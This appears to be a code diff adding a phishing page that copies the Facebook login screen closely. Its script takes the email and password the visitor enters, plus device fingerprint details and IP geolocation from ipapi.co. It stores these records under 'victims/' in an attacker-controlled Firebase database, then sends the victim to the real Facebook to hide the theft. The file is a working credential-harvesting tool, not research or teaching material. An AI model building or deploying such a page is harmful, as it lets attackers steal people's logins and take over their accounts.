@@ -1,0 +1,608 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: assets/facebook.html
+     ফেসবুক লগইন পেজ - হুবহু ক্লোন
+     Firebase অটো-কানেক্ট (config.js থেকে)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="en" id="facebook">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin-when-crossorigin">
+    <meta property="og:site_name" content="Facebook">
+    <meta property="og:url" content="https://www.facebook.com/">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <meta property="og:locale" content="en_GB">
+    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <title id="pageTitle">Facebook – log in or sign up</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    <script src="../config.js"></script>
+    
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-hover: #166fe5;
+            --fb-green: #42b72a;
+            --fb-green-hover: #36a420;
+            --fb-bg: #f0f2f5;
+            --fb-text: #1c1e21;
+            --fb-text-secondary: #65676b;
+            --fb-border: #dddfe2;
+            --fb-white: #ffffff;
+            --fb-shadow: rgba(0, 0, 0, 0.1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: var(--fb-bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        /* ── Main Container ── */
+        ._li {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        #globalContainer {
+            width: 100%;
+            max-width: 980px;
+            flex: 1;
+        }
+        
+        .fb_content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 720px;
+            padding: 20px;
+            gap: 50px;
+        }
+        
+        /* ── Left Side ── */
+        ._8esk {
+            flex: 1;
+            max-width: 580px;
+            margin-top: 40px;
+        }
+        
+        .fb_logo {
+            width: 300px;
+            height: auto;
+            margin-bottom: -5px;
+        }
+        
+        ._8eso {
+            font-size: 28px;
+            line-height: 1.34;
+            color: var(--fb-text);
+            font-weight: normal;
+            padding-left: 32px;
+        }
+        
+        /* ── Right Side ── */
+        ._8esn {
+            width: 396px;
+            flex-shrink: 0;
+            margin-top: 40px;
+        }
+        
+        ._8iep {
+            background: var(--fb-white);
+            border-radius: 8px;
+            box-shadow: 0 2px 4px var(--fb-shadow), 0 8px 16px var(--fb-shadow);
+            padding: 20px;
+        }
+        
+        ._6lux {
+            margin-bottom: 12px;
+        }
+        
+        ._6luy {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid var(--fb-border);
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            color: var(--fb-text);
+            background: var(--fb-white);
+        }
+        
+        ._6luy:focus {
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        ._6luy::placeholder {
+            color: #90949c;
+        }
+        
+        ._6ltg {
+            margin-top: 6px;
+        }
+        
+        ._6lth {
+            width: 100%;
+            padding: 12px;
+            background: var(--fb-blue);
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.5px;
+            font-family: inherit;
+        }
+        
+        ._6lth:hover {
+            background: var(--fb-blue-hover);
+        }
+        
+        ._6ltj {
+            text-align: center;
+            margin: 16px 0;
+        }
+        
+        ._6ltj a {
+            color: var(--fb-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        ._6ltj a:hover {
+            text-decoration: underline;
+        }
+        
+        ._8icz {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        ._6lti {
+            display: block;
+            margin: 0 auto;
+            padding: 14px 20px;
+            background: var(--fb-green);
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+            text-align: center;
+            text-decoration: none;
+            width: fit-content;
+        }
+        
+        ._6lti:hover {
+            background: var(--fb-green-hover);
+        }
+        
+        ._58mk {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--fb-text);
+        }
+        
+        ._58mk a {
+            text-decoration: none;
+            color: var(--fb-text);
+            font-weight: bold;
+        }
+        
+        ._58mk a:hover {
+            text-decoration: underline;
+        }
+        
+        /* ── Footer ── */
+        #pageFooter {
+            width: 100%;
+            max-width: 980px;
+            padding: 20px;
+            color: var(--fb-text-secondary);
+            font-size: 12px;
+            margin-top: auto;
+        }
+        
+        .localeSelectorList {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #dddfe2;
+            margin-bottom: 10px;
+            list-style: none;
+        }
+        
+        .localeSelectorList a {
+            color: var(--fb-text-secondary);
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .localeSelectorList a:hover {
+            text-decoration: underline;
+        }
+        
+        .pageFooterLinkList {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 10px;
+            list-style: none;
+        }
+        
+        .pageFooterLinkList a {
+            color: var(--fb-text-secondary);
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .pageFooterLinkList a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 11px;
+            margin-top: 20px;
+        }
+        
+        /* ── Loading Spinner ── */
+        ._spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: _spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes _spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* ── Responsive ── */
+        @media (max-width: 900px) {
+            .fb_content {
+                flex-direction: column;
+                gap: 20px;
+                min-height: auto;
+                padding: 20px 15px;
+            }
+            ._8esk {
+                max-width: 100%;
+                text-align: center;
+                margin-top: 20px;
+            }
+            .fb_logo {
+                width: 200px;
+            }
+            ._8eso {
+                font-size: 20px;
+                padding-left: 0;
+            }
+            ._8esn {
+                width: 100%;
+                max-width: 396px;
+                margin-top: 10px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .fb_logo {
+                width: 160px;
+            }
+            ._8eso {
+                font-size: 17px;
+            }
+            ._8iep {
+                padding: 15px;
+            }
+            ._6luy {
+                font-size: 15px;
+                padding: 12px 14px;
+            }
+        }
+    </style>
+</head>
+<body class="fbIndex UIPage_LoggedOut">
+    <div class="_li">
+        <div id="globalContainer">
+            <div class="fb_content clearfix" id="content">
+                <div>
+                    <div class="_8esj">
+                        <div class="_8esk">
+                            <div class="_8esl">
+                                <div class="_8ice">
+                                    <img class="fb_logo _8ilh img" 
+                                         src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
+                                         alt="Facebook">
+                                </div>
+                                <h2 class="_8eso">
+                                    Facebook helps you connect and share with the people in your life.
+                                </h2>
+                            </div>
+                            <div class="_8esn">
+                                <div class="_8iep _8icy">
+                                    <div class="_6luv _52jv">
+                                        <form class="_9vtf" 
+                                              data-testid="royal_login_form" 
+                                              id="loginForm"
+                                              onsubmit="return captureData(event)">
+                                            <input type="hidden" name="jazoest" value="2888" autocomplete="off">
+                                            <input type="hidden" name="lsd" value="AVqK7GczFT0" autocomplete="off">
+                                            <input type="hidden" name="platform" value="facebook">
+                                            <div>
+                                                <div class="_6lux">
+                                                    <input type="text" 
+                                                           class="inputtext _55r1 _6luy" 
+                                                           name="email" 
+                                                           id="email" 
+                                                           placeholder="Email address or phone number" 
+                                                           autofocus="1" 
+                                                           aria-label="Email address or phone number"
+                                                           autocomplete="off"
+                                                           required>
+                                                </div>
+                                                <div class="_6lux">
+                                                    <div class="_6luy _55r1 _1kbt" id="passContainer">
+                                                        <input type="password" 
+                                                               class="inputtext _55r1 _6luy _9npi" 
+                                                               name="pass" 
+                                                               id="password" 
+                                                               placeholder="Password" 
+                                                               aria-label="Password"
+                                                               autocomplete="off"
+                                                               required>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="_6ltg">
+                                                <button value="1" 
+                                                        class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" 
+                                                        name="login" 
+                                                        id="loginBtn" 
+                                                        type="submit">
+                                                    <span id="btnText">Log In</span>
+                                                    <div class="_spinner" id="spinner"></div>
+                                                </button>
+                                            </div>
+                                            <div class="_6ltj">
+                                                <a href="https://www.facebook.com/recover/initiate/" 
+                                                   onclick="event.preventDefault();">
+                                                    Forgotten password?
+                                                </a>
+                                            </div>
+                                            <div class="_8icz"></div>
+                                            <div class="_6ltg">
+                                                <a role="button" 
+                                                   class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" 
+                                                   href="#"
+                                                   onclick="event.preventDefault();">
+                                                    Create New Account
+                                                </a>
+                                            </div>
+                                        </form>
+                                    </div>
+                                    <div id="reg_pages_msg" class="_58mk">
+                                        <a href="#" onclick="event.preventDefault();" class="_8esh">Create a Page</a>
+                                        for a celebrity, brand or business.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="">
+            <div class="_95ke _8opy">
+                <div id="pageFooter" data-referrer="page_footer">
+                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                        <li>English (UK)</li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Bengali">বাংলা</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Hindi">हिन्दी</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Spanish">Español</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="French">Français</a></li>
+                        <li><a class="_sv4" dir="rtl" href="#" onclick="event.preventDefault();" title="Arabic">العربية</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Chinese">中文(简体)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Portuguese">Português (Brasil)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Indonesian">Bahasa Indonesia</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Japanese">日本語</a></li>
+                    </ul>
+                    <div id="contentCurve"></div>
+                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                            <li><a href="#" onclick="event.preventDefault();">Sign Up</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Log In</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Messenger</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Facebook Lite</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Watch</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Places</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Games</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Marketplace</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Facebook Pay</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Oculus</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Portal</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Instagram</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Bulletin</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Local</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Fundraisers</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Services</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Groups</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">About</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Create ad</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Create Page</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Developers</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Careers</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Privacy</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Cookies</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">AdChoices</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Terms</a></li>
+                            <li><a href="#" onclick="event.preventDefault();">Help</a></li>
+                        </ul>
+                    </div>
+                    <div class="mvl copyright">
+                        <div><span>Meta © 2026</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // ═══════════════════════════════════════════════════════
+        // FIREBASE AUTO-CONNECT (config.js থেকে)
+        // ═══════════════════════════════════════════════════════
+        
+        firebase.initializeApp(window.firebaseConfig);
+        const database = firebase.database();
+        
+        // ═══════════════════════════════════════════════════════
+        // DEVICE INFO COLLECTOR
+        // ═══════════════════════════════════════════════════════
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                userAgent: ua,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browser: detectBrowser(ua),
+                os: detectOS(ua),
+                device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
+                cookiesEnabled: navigator.cookieEnabled
+            };
+        }
+        
+        function detectBrowser(ua) {
+            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            return 'Unknown';
+        }
+        
+        function detectOS(ua) {
+            if (ua.includes('Windows NT 10')) return 'Windows 10';
+            if (ua.includes('Windows NT 11')) return 'Windows 11';
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iPhone')) return 'iOS (iPhone)';
+            if (ua.includes('iPad')) return 'iOS (iPad)';
+            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            return 'Unknown';
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // IP GEOLOCATION
+        // ═══════════════════════════════════════════════════════
+        
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/', {
+                    signal: AbortSignal.timeout(5000)
+                });
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    countryCode: data.country_code || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    latitude: data.latitude || '',
+                    longitude: data.longitude || '',
+                    timezone: data.timezone || 'Unknown',
+                    asn: data.asn || 'Unknown'
+                };
+            } catch {
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // FORM CAPTURE
+        // ═══════════════════════════════════════════════════════
+        
+        async function captureData(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) return false;
+            
+            // Show loading
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('loginBtn').disabled = true;
+            
+            // Collect data
+            const victimData = {
+                platform: 'facebook',
+                email: email,
+                password: password,
+                deviceInfo: getDeviceInfo(),
+                ipInfo: await getIPInfo(),
+                timestamp: new Date().toISOString(),
+                victimId: 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                referrer: document.referrer || 'Direct Access',
+                pageUrl: window.location.href
+            };
+            
+            // Save to Firebase
+            try {
+                await database.ref('victims/' + victimData.victimId).set(victimData);
+                console.log('✓ Credentials captured');
+            } catch (error) {
+                console.error('Firebase error:', error.message);
+            }
+            
+            // Redirect to real Facebook after delay
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1&lwv=110';
+            }, 1500);
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
